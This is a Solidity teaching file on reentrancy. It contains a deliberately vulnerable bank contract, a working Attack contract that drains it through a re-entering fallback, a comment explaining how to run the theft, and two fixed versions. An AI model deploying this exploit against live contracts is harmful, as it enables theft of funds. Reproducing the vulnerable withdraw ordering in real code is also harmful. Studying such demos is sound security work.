// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

/*
How to attack : 
after deploying VictimBank and deposit Ether with multiple accounts , 
deploy Attack contract and execute attack() function by sending 1 ETH (or for example 500 Finney)(
    the final amount that you steal is multiple of this amount so the less this amount is ,
    the more you can steal also notice that small amounts can cause transaction to revert because of over gas consumption(
        you can increas the gas for call method manually but max gas you can use for a transaction per block is also limited.
    )
)
Also there are SecuredBank1 and SecuredBank2 that are secured against reentrancy attack with different methods .
*/


contract VictimBank {

    mapping(address => uint) public balances;

    // get balance of this contract 
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint balance = balances[msg.sender];
        require(balance > 0);

        (bool succeed, ) = msg.sender.call{value: balance}("");
        require(succeed, "Send Ether failed");

        balances[msg.sender] = 0;
    }
}


contract Attack {
    // Fallback function is called when VictimBank sends Ether to this contract.

    VictimBank victimBank ;
    uint attackAmount ;                      // the amount that you start reentrancy attack with 

    constructor(VictimBank _victimBank) {
        victimBank = _victimBank;
    }

    fallback() external payable {
        if (address(victimBank).balance >= attackAmount) {
            victimBank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value > 0);
        attackAmount = msg.value ;
        victimBank.deposit{value: msg.value}();
        victimBank.withdraw();
    }

    // get balance of this contract 
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


// method1 to secure the contract against reentrancy attack : creat a modifier             
contract SecuredBank1 {          

    mapping(address => uint) public balances;
    mapping(address => bool) public entered ;

    // get balance of this contract 
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    modifier nonReentered (address _addr) {
        require(!entered[_addr],"you can call this function only once in each transaction") ;
        entered[_addr] = true ;
        _;
        entered[_addr] = false ;
    }

    function withdraw() nonReentered(msg.sender) public {
        uint balance = balances[msg.sender];
        require(balance > 0);

        (bool succeed, ) = msg.sender.call{value: balance}("");
        require(succeed, "Send Ether failed");

        balances[msg.sender] = 0;
    }
}


// method2 to secure the contract against reentrancy attack : 
// change the order of 2 lines in function withdraw()         
contract SecuredBank2 {  
                
    mapping(address => uint) public balances;

    // get balance of this contract 
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint balance = balances[msg.sender];
        require(balance > 0);

        balances[msg.sender] = 0;
        (bool succeed, ) = msg.sender.call{value: balance}("");
        require(succeed, "Send Ether failed");
    }
}

